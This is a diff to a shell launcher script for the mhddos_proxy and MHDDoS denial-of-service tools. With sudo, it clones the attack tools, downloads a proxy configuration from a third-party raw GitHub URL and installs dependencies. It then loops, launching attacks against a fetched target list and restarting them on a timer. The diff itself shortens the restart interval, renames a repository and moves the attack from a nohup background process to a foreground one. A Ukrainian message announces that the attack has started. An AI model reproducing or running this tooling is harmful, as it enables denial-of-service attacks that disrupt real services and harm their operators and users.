@@ -11,7 +11,7 @@
 ## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
 ## It allows to download updates for mhddos_proxy, MHDDoS and target list.
 ## By default 600s (10m), can be passed as second parameter
-restart_interval="9m"
+restart_interval="1m"
 
 
 #parameters that passed to python scrypt
@@ -42,8 +42,8 @@ git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 sudo rm proxies_config.json
 sudo wget https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json
-git clone https://github.com/alexnest-ua/mhddos.git
-sudo python3 -m pip install -r mhddos/requirements.txt
+git clone https://github.com/alexnest-ua/MHDDoS.git
+sudo python3 -m pip install -r MHDDoS/requirements.txt
 cd ~
 
 # Restart attacks and update targets list every 10 minutes (by default)
@@ -69,7 +69,8 @@ do
             echo "$cmd_line $proxy_interval $rpc"
             
             cd ~/mhddos_proxy
-            nohup sudo python3 $cmd_line $proxy_interval $rpc </dev/null &>/dev/null &
+            sudo python3 $cmd_line $proxy_interval $rpc
+            #nohup sudo python3 $cmd_line $proxy_interval $rpc </dev/null &>/dev/null &
             echo -e "Атаку розпочато успішно, не переймайтеся, що нічого не виводиться на екран – атака запущена у фоні, щоб вона не завершилася при закритті терміналу"
    done
    
